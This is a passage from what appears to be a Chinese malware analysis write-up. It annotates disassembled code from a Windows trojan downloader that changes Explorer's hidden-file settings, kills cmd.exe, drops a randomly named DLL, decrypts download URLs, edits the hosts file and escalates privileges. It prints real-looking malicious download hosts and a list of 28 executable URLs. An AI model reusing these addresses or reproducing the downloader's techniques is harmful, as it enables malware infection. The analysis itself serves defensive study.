
```asm
mov     esi, offset aSoftwareMicr_0 ; Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced
seg001:004160FC                pop     ecx
seg001:004160FD                lea     edi, [ebp+SubKey]
seg001:00416100                rep movsd
seg001:00416102                push    9
seg001:00416104                xor     eax, eax
seg001:00416106                pop     ecx
seg001:00416107                lea     edi, [ebp+var_38]
seg001:0041610A                rep stosd
seg001:0041610C                stosw
seg001:0041610E                and     [ebp+var_10], 0
seg001:00416112                mov     dword ptr [ebp+Data], 2
seg001:00416119                stosb
seg001:0041611A                lea     eax, [ebp+hKey]
seg001:0041611D                mov     [ebp+var_C], 1
seg001:00416124                push    eax                 ; phkResult
seg001:00416125                lea     eax, [ebp+SubKey]
seg001:00416128                push    eax                 ; lpSubKey
seg001:00416129                push    80000001h           ; hKey
seg001:0041612E                call    RegCreateKeyA
seg001:00416134                push    4
seg001:00416136                lea     eax, [ebp+Data]
seg001:00416139                pop     edi
seg001:0041613A                mov     esi, RegSetValueExA
seg001:00416140                push    edi                 ; cbData
seg001:00416141                push    eax                 ; lpData
seg001:00416142                push    edi                 ; dwType
seg001:00416143                push    0                   ; Reserved
seg001:00416145                push    offset aHidden      ; "Hidden"
seg001:0041614A                push    [ebp+hKey]          ; hKey
seg001:0041614D                call    esi ; RegSetValueExA
seg001:0041614F                lea     eax, [ebp+var_C]
seg001:00416152                push    edi                 ; cbData
seg001:00416153                push    eax                 ; lpData
seg001:00416154                push    edi                 ; dwType
seg001:00416155                push    0                   ; Reserved
seg001:00416157                push    offset aSuperhidden ; "SuperHidden"
seg001:0041615C                push    [ebp+hKey]          ; hKey
seg001:0041615F                call    esi ; RegSetValueExA
seg001:00416161                lea     eax, [ebp+var_10]
seg001:00416164                push    edi                 ; cbData
seg001:00416165                push    eax                 ; lpData
seg001:00416166                push    edi                 ; dwType
seg001:00416167                push    0                   ; Reserved
seg001:00416169                push    offset aShowsuperhidde ; "ShowSuperHidden"
seg001:0041616E                push    [ebp+hKey]          ; hKey
seg001:00416171                call    esi ; RegSetValueExA
seg001:00416173                push    [ebp+hKey]          ; hKey
seg001:00416176                call    RegCloseKey
seg001:0041617C                pop     edi
seg001:0041617D                pop     esi
seg001:0041617E                leave
```

### 8、干掉 `cmd.exe`

代码：

```asm
push    offset Str1     ; "cmd.exe"
seg001:00414B47                call    _stricmp
seg001:00414B4C                pop     ecx
seg001:00414B4D                test    eax, eax
seg001:00414B4F                pop     ecx
seg001:00414B50                jnz     short loc_414B33
seg001:00414B52                push    dword ptr [esi+8] ; dwProcessId
seg001:00414B55                push    eax               ; bInheritHandle
seg001:00414B56                push    1                 ; dwDesiredAccess
seg001:00414B58                call    OpenProcess
seg001:00414B5E                push    0                 ; uExitCode
seg001:00414B60                push    eax               ; hProcess
seg001:00414B61                call    TerminateProcess
```

### 9、释放随机 `dll` 文件

代码：

```asm
seg001:00415E30                push    eax                 ; lpBuffer
seg001:00415E31                push    104h                ; nBufferLength
seg001:00415E36                call    __imp_GetTempPathA  ; 找到临时路径
seg001:00415E3C                call    __imp_GetTickCount
seg001:00415E42                push    eax
seg001:00415E43                lea     eax, [ebp+Buffer]
seg001:00415E49                push    eax
seg001:00415E4A                mov     esi, offset byte_4169EC
seg001:00415E4F                push    offset aSX_dll      ; "%s%x.dll"
seg001:00415E54                push    esi                 ; LPSTR
seg001:00415E55                call    wsprintfA
seg001:00415E5B                push    esi                 ; lpFileName
seg001:00415E5C                call    sub_414AB4          ; 释放随机命名的 dll 文件
seg001:00415E61                add     esp, 14h
```

### 10、下载者列表

代码：

```asm
seg001:00415E71                push    offset aOlojvssfysgvqn ; "防蕉}olYSQNLI>px6kfrhYX P_Y"
seg001:00415E76                call    sub_414FA0          ; 解密 call，解密后为 http://tongji1.ac5566.cn/getmac.asp
seg001:00415E7B                mov     [esp+114h+var_114], offset dword_4144EC
seg001:00415E82                call    sub_414FA0          ; 解密 call，解密后为 http://txt.naiws.com/oo.txt
seg001:00415E87                call    sub_415750          ; 调用 URLDownloadToFileA 函数下载列表上的病毒
seg001:00415E8C                mov     esi, Sleep
seg001:00415E92                mov     [esp+114h+var_114], 0C350h
seg001:00415E99                call    esi ; Sleep
seg001:00415E9B                push    offset dword_4145C0
seg001:00415EA0                call    sub_414FA0          ; 解密 call，解密后为 http://txt.naiws.com/ad.jpg
seg001:00415EA5                pop     ecx
seg001:00415EA6                call    sub_415BE0          ; 修改 hosts 文件
seg001:00415EAB                call    sub_4151DD          ; 继续解密，获得 Netbios 信息
seg001:00415EB0                mov     edi, 1F4h
seg001:00415EB5                push    edi                 ; dwMilliseconds
```

`sadfasdf.jpg` 实际是一个列表文件，内容：

```ini
[file]
open=y
url1=http://www.wixks.com/new/new1.exe
url2=http://www.wixks.com/new/new2.exe
url3=http://www.wixks.com/new/new3.exe
url4=http://www.wixks.com/new/new4.exe
url5=http://www.wixks.com/new/new5.exe
url6=http://www.wixks.com/new/new6.exe
url7=http://www.wixks.com/new/new7.exe
url8=http://www.wixks.com/new/new8.exe
url9=http://www.wixks.com/new/new9.exe
url10=http://www.wixks.com/new/new10.exe
url11=http://www.wixks.com/new/new11.exe
url12=http://www.wixks.com/new/new12.exe
url13=http://www.wixks.com/new/new13.exe
url14=http://www.wixks.com/new/new14.exe
url15=http://www.wixks.com/new/new15.exe
url16=http://www.wixks.com/new/new16.exe
url17=http://www.wixks.com/new/new17.exe
url18=http://www.wixks.com/new/new18.exe
url19=http://www.wixks.com/new/new19.exe
url20=http://www.wixks.com/new/new20.exe
url21=http://www.wixks.com/new/new21.exe
url22=http://www.wixks.com/new/new22.exe
url23=http://www.wixks.com/new/new23.exe
url24=http://www.wixks.com/new/new24.exe
url25=http://www.wixks.com/new/new25.exe
url26=http://www.wixks.com/new/new26.exe
url27=http://www.wixks.com/new/new27.exe
url28=http://www.wixks.com/new/new28.exe
count=28
```

### 11、提权

代码：

```asm
call    sub_416223      ; 提权
```

### 12、创建一个名为 `Kisstusb` 的服务，完成后清除该服务

代码：
